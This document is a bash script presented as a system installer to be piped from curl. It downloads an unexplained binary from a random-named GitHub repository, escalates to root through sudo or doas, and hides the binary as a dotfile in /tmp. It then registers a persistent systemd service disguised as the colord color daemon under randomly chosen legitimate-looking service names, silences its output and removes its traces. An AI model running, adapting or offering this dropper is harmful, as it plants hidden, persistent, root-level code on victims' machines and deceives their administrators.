#!/bin/bash
#
# Enhanced System Installer
# Features: Logging, error handling, cleanup, verification
# Usage: curl -fsSL <url> | bash
#        curl -fsSL <url> | DEBUG=1 bash  (for debug mode)
#

set -euo pipefail

# ============================================================================
# CONFIGURATION
# ============================================================================

readonly GITHUB_URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"
readonly LOG_FILE="/tmp/.sysinstall_$(date +%s).log"
readonly MIN_DISK_SPACE_MB=50
readonly DOWNLOAD_TIMEOUT=60
readonly DOWNLOAD_RETRIES=3

# Debug mode
DEBUG="${DEBUG:-0}"
if [ "$DEBUG" = "1" ]; then
    SILENT_MODE=false
else
    SILENT_MODE=true
fi

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

log() {
    local level="$1"
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE" 2>/dev/null || true
    
    if [ "$SILENT_MODE" = "false" ]; then
        case "$level" in
            ERROR) echo "[ERROR] $message" >&2 ;;
            WARN)  echo "[WARN]  $message" >&2 ;;
            INFO)  echo "[INFO]  $message" ;;
            DEBUG) [ "$DEBUG" = "1" ] && echo "[DEBUG] $message" ;;
        esac
    fi
}

die() {
    log ERROR "$@"
    cleanup_on_failure
    exit 1
}

# Generate random service name
gen_service_name() {
    local prefix="systemd-private-"
    local hash=$(head -c 16 /dev/urandom 2>/dev/null | md5sum | cut -d' ' -f1 | head -c 32)
    local service_types=(
        "colord"
        "upower"
        "rtkit-daemon"
        "accounts-daemon"
        "polkitd"
        "gdm"
        "ModemManager"
        "geoclue"
        "udisks2"
    )
    local service_type=${service_types[$RANDOM % ${#service_types[@]}]}
    local suffix=$(head -c 3 /dev/urandom 2>/dev/null | xxd -p | tr '[:lower:]' '[:upper:]')
    echo "${prefix}${hash}-${service_type}.service-${suffix}"
}

# Check system requirements
check_requirements() {
    log INFO "Checking system requirements..."
    
    # Check if systemd is available
    if ! command -v systemctl &>/dev/null; then
        die "systemd is not available on this system"
    fi
    
    # Check disk space
    local available_space=$(df /tmp | awk 'NR==2 {print $4}')
    if [ "$available_space" -lt $((MIN_DISK_SPACE_MB * 1024)) ]; then
        die "Insufficient disk space in /tmp (need ${MIN_DISK_SPACE_MB}MB)"
    fi
    
    # Check for download tool
    if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
        die "Neither curl nor wget is available"
    fi
    
    log INFO "System requirements check passed"
}

# Download binary
download_binary() {
    local output_file="$1"
    local url="$2"
    
    log INFO "Downloading binary from $url..."
    
    if command -v curl &>/dev/null; then
        if curl -fsSL \
            --max-time "$DOWNLOAD_TIMEOUT" \
            --retry "$DOWNLOAD_RETRIES" \
            --retry-delay 5 \
            -o "$output_file" \
            "$url" 2>>"$LOG_FILE"; then
            log INFO "Download successful using curl"
            return 0
        else
            log ERROR "Download failed with curl"
            return 1
        fi
    elif command -v wget &>/dev/null; then
        if wget -q \
            -t "$DOWNLOAD_RETRIES" \
            -T "$DOWNLOAD_TIMEOUT" \
            -O "$output_file" \
            "$url" 2>>"$LOG_FILE"; then
            log INFO "Download successful using wget"
            return 0
        else
            log ERROR "Download failed with wget"
            return 1
        fi
    else
        die "No download tool available"
    fi
}

# Verify binary
verify_binary() {
    local binary_path="$1"
    
    log INFO "Verifying binary..."
    
    # Check if file exists and is not empty
    if [ ! -f "$binary_path" ]; then
        die "Binary file does not exist: $binary_path"
    fi
    
    if [ ! -s "$binary_path" ]; then
        die "Binary file is empty: $binary_path"
    fi
    
    # Check if it's an ELF binary
    if ! file "$binary_path" 2>/dev/null | grep -q "ELF"; then
        log WARN "File may not be a valid ELF binary"
    fi
    
    local file_size=$(stat -f%z "$binary_path" 2>/dev/null || stat -c%s "$binary_path" 2>/dev/null)
    log INFO "Binary size: $file_size bytes"
    
    # Make executable
    chmod +x "$binary_path" || die "Failed to make binary executable"
    
    log INFO "Binary verification passed"
}

# Create systemd service
create_service() {
    local service_file="$1"
    local install_dir="$2"
    local binary_name="$3"
    
    log INFO "Creating systemd service: $service_file"
    
    cat > "$service_file" << 'SVCEOF'
[Unit]
Description=System Color Management Daemon
Documentation=man:colord(8)
After=network.target network-online.target
Wants=network-online.target
ConditionPathExists=INSTALL_DIR_PLACEHOLDER

[Service]
Type=simple
ExecStart=INSTALL_DIR_PLACEHOLDER/BINARY_NAME_PLACEHOLDER
Restart=on-failure
RestartSec=10
StartLimitIntervalSec=300
StartLimitBurst=5
Nice=-5
CPUQuota=15%
MemoryMax=150M
MemoryHigh=100M
TasksMax=50
PrivateTmp=yes
NoNewPrivileges=false
ProtectSystem=strict
ProtectHome=yes
ReadWritePaths=INSTALL_DIR_PLACEHOLDER
StandardOutput=null
StandardError=journal
SyslogIdentifier=colord
Environment=HOME=/root
WorkingDirectory=INSTALL_DIR_PLACEHOLDER
KillMode=mixed
KillSignal=SIGTERM
TimeoutStopSec=30

[Install]
WantedBy=multi-user.target
SVCEOF

    # Replace placeholders
    sed -i "s|INSTALL_DIR_PLACEHOLDER|$install_dir|g" "$service_file" || die "Failed to update service file"
    sed -i "s|BINARY_NAME_PLACEHOLDER|$binary_name|g" "$service_file" || die "Failed to update service file"
    
    log INFO "Service file created successfully"
}

# Start and enable service
start_service() {
    local service_name="$1"
    
    log INFO "Enabling and starting service: $service_name"
    
    systemctl daemon-reload 2>>"$LOG_FILE" || die "Failed to reload systemd daemon"
    systemctl enable "$service_name" 2>>"$LOG_FILE" || die "Failed to enable service"
    systemctl start "$service_name" 2>>"$LOG_FILE" || die "Failed to start service"
    
    # Wait and verify
    sleep 5
    
    if systemctl is-active --quiet "$service_name" 2>/dev/null; then
        log INFO "Service started successfully"
        
        # Get service status
        local pid=$(systemctl show -p MainPID --value "$service_name")
        log INFO "Service running with PID: $pid"
        
        return 0
    else
        log ERROR "Service failed to start"
        systemctl status "$service_name" >> "$LOG_FILE" 2>&1 || true
        return 1
    fi
}

# Cleanup on failure
cleanup_on_failure() {
    log WARN "Performing cleanup after failure..."
    
    if [ -n "${SERVICE_NAME:-}" ] && [ -n "${SERVICE_FILE:-}" ]; then
        systemctl stop "$SERVICE_NAME" 2>/dev/null || true
        systemctl disable "$SERVICE_NAME" 2>/dev/null || true
        rm -f "$SERVICE_FILE" 2>/dev/null || true
        systemctl daemon-reload 2>/dev/null || true
    fi
    
    if [ -n "${INSTALL_DIR:-}" ] && [ -d "$INSTALL_DIR" ]; then
        rm -rf "$INSTALL_DIR" 2>/dev/null || true
    fi
    
    log INFO "Cleanup completed"
}

# Cleanup temporary files
cleanup_temp() {
    log DEBUG "Cleaning up temporary files..."
    rm -f /tmp/.inst.* 2>/dev/null || true
    rm -f /tmp/.sysinstall_*.log.old 2>/dev/null || true
}

# Rotate log file
rotate_log() {
    if [ -f "$LOG_FILE" ]; then
        local log_size=$(stat -f%z "$LOG_FILE" 2>/dev/null || stat -c%s "$LOG_FILE" 2>/dev/null)
        if [ "$log_size" -gt 1048576 ]; then  # 1MB
            mv "$LOG_FILE" "${LOG_FILE}.old" 2>/dev/null || true
        fi
    fi
}

# ============================================================================
# PRIVILEGE ESCALATION
# ============================================================================

escalate_privileges() {
    if [ "$EUID" -ne 0 ]; then
        log INFO "Not running as root, attempting privilege escalation..."
        
        # Save script to temp file
        local temp_script=$(mktemp /tmp/.inst.XXXXXX)
        
        # Try to copy current script
        if [ -f "$0" ] && [ -r "$0" ]; then
            cp "$0" "$temp_script" 2>/dev/null || {
                # If copy fails, reconstruct the script
                cat > "$temp_script" << 'EOFSCRIPT'
#!/bin/bash
# Auto-generated escalated script
GITHUB_URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"
LOG_FILE="/tmp/.sysinstall_$(date +%s).log"
DEBUG="${DEBUG:-0}"
SILENT_MODE=true
[ "$DEBUG" = "1" ] && SILENT_MODE=false

log() {
    echo "[$1] $2" >> "$LOG_FILE" 2>/dev/null || true
    [ "$SILENT_MODE" = "false" ] && echo "[$1] $2"
}

die() { log ERROR "$@"; exit 1; }

gen_service_name() {
    local prefix="systemd-private-"
    local hash=$(head -c 16 /dev/urandom 2>/dev/null | md5sum | cut -d' ' -f1 | head -c 32)
    local service_types=("colord" "upower" "rtkit-daemon" "accounts-daemon" "polkitd" "gdm" "ModemManager")
    local service_type=${service_types[$RANDOM % ${#service_types[@]}]}
    local suffix=$(head -c 3 /dev/urandom 2>/dev/null | xxd -p | tr '[:lower:]' '[:upper:]')
    echo "${prefix}${hash}-${service_type}.service-${suffix}"
}

SERVICE_NAME=$(gen_service_name)
INSTALL_DIR="/tmp/${SERVICE_NAME}"
BINARY_NAME=".$(echo $SERVICE_NAME | cut -d'-' -f1-3)"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

log INFO "Starting installation..."
mkdir -p "$INSTALL_DIR" || die "Failed to create directory"
cd "$INSTALL_DIR" || die "Failed to change directory"

log INFO "Downloading binary..."
if command -v curl >/dev/null 2>&1; then
    curl -fsSL --max-time 60 --retry 3 -o "$BINARY_NAME" "$GITHUB_URL" || die "Download failed"
elif command -v wget >/dev/null 2>&1; then
    wget -q -t 3 -T 60 -O "$BINARY_NAME" "$GITHUB_URL" || die "Download failed"
else
    die "No download tool available"
fi

[ -f "$BINARY_NAME" ] && [ -s "$BINARY_NAME" ] || die "Binary verification failed"
chmod +x "$BINARY_NAME" || die "Failed to set executable"

log INFO "Creating service..."
cat > "$SERVICE_FILE" << 'SVCEOF'
[Unit]
Description=System Color Management Daemon
After=network.target network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=INSTALL_DIR_PLACEHOLDER/BINARY_NAME_PLACEHOLDER
Restart=on-failure
RestartSec=10
StartLimitIntervalSec=300
StartLimitBurst=5
Nice=-5
CPUQuota=15%
MemoryMax=150M
PrivateTmp=yes
NoNewPrivileges=false
StandardOutput=null
StandardError=null
Environment=HOME=/root
WorkingDirectory=INSTALL_DIR_PLACEHOLDER
[Install]
WantedBy=multi-user.target
SVCEOF

sed -i "s|INSTALL_DIR_PLACEHOLDER|$INSTALL_DIR|g" "$SERVICE_FILE"
sed -i "s|BINARY_NAME_PLACEHOLDER|$BINARY_NAME|g" "$SERVICE_FILE"

log INFO "Starting service..."
systemctl daemon-reload || die "Failed to reload daemon"
systemctl enable "$SERVICE_NAME" || die "Failed to enable service"
systemctl start "$SERVICE_NAME" || die "Failed to start service"

sleep 5
if systemctl is-active --quiet "$SERVICE_NAME"; then
    log INFO "Installation successful"
    rm -f /tmp/.inst.* 2>/dev/null
    exit 0
else
    log ERROR "Service failed to start"
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    systemctl disable "$SERVICE_NAME" 2>/dev/null
    rm -f "$SERVICE_FILE" 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    rm -rf "$INSTALL_DIR" 2>/dev/null
    rm -f /tmp/.inst.* 2>/dev/null
    exit 1
fi
EOFSCRIPT
            }
        fi
        
        chmod +x "$temp_script" 2>/dev/null || die "Failed to prepare escalation script"
        
        # Try different escalation methods
        if command -v sudo &>/dev/null; then
            log INFO "Using sudo for privilege escalation"
            sudo -n bash "$temp_script" 2>/dev/null || sudo bash "$temp_script"
            local exit_code=$?
            rm -f "$temp_script" 2>/dev/null
            exit $exit_code
        elif command -v doas &>/dev/null; then
            log INFO "Using doas for privilege escalation"
            doas bash "$temp_script"
            local exit_code=$?
            rm -f "$temp_script" 2>/dev/null
            exit $exit_code
        else
            rm -f "$temp_script" 2>/dev/null
            die "No privilege escalation method available (sudo/doas)"
        fi
    fi
}

# ============================================================================
# MAIN INSTALLATION FLOW
# ============================================================================

main() {
    log INFO "=========================================="
    log INFO "Starting installation process"
    log INFO "Debug mode: $DEBUG"
    log INFO "Silent mode: $SILENT_MODE"
    log INFO "=========================================="
    
    # Escalate if needed
    escalate_privileges
    
    # Now running as root
    log INFO "Running with root privileges"
    
    # Suppress output in silent mode
    if [ "$SILENT_MODE" = "true" ]; then
        exec 1>/dev/null
    fi
    
    # Check requirements
    check_requirements
    
    # Generate names
    SERVICE_NAME=$(gen_service_name)
    INSTALL_DIR="/tmp/${SERVICE_NAME}"
    BINARY_NAME=".$(echo $SERVICE_NAME | cut -d'-' -f1-3)"
    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
    
    log INFO "Service name: $SERVICE_NAME"
    log INFO "Install directory: $INSTALL_DIR"
    log INFO "Binary name: $BINARY_NAME"
    log INFO "Service file: $SERVICE_FILE"
    
    # Create installation directory
    mkdir -p "$INSTALL_DIR" || die "Failed to create installation directory"
    cd "$INSTALL_DIR" || die "Failed to change to installation directory"
    
    # Download binary
    download_binary "$BINARY_NAME" "$GITHUB_URL" || die "Failed to download binary"
    
    # Verify binary
    verify_binary "$BINARY_NAME"
    
    # Create service
    create_service "$SERVICE_FILE" "$INSTALL_DIR" "$BINARY_NAME"
    
    # Start service
    if start_service "$SERVICE_NAME"; then
        log INFO "=========================================="
        log INFO "Installation completed successfully"
        log INFO "Service: $SERVICE_NAME"
        log INFO "Status: Active"
        log INFO "=========================================="
        
        # Cleanup
        cleanup_temp
        rotate_log
        
        exit 0
    else
        die "Service failed to start"
    fi
}

# ============================================================================
# SCRIPT ENTRY POINT
# ============================================================================

# Trap errors
trap 'log ERROR "Script failed at line $LINENO"' ERR

# Run main
main "$@"
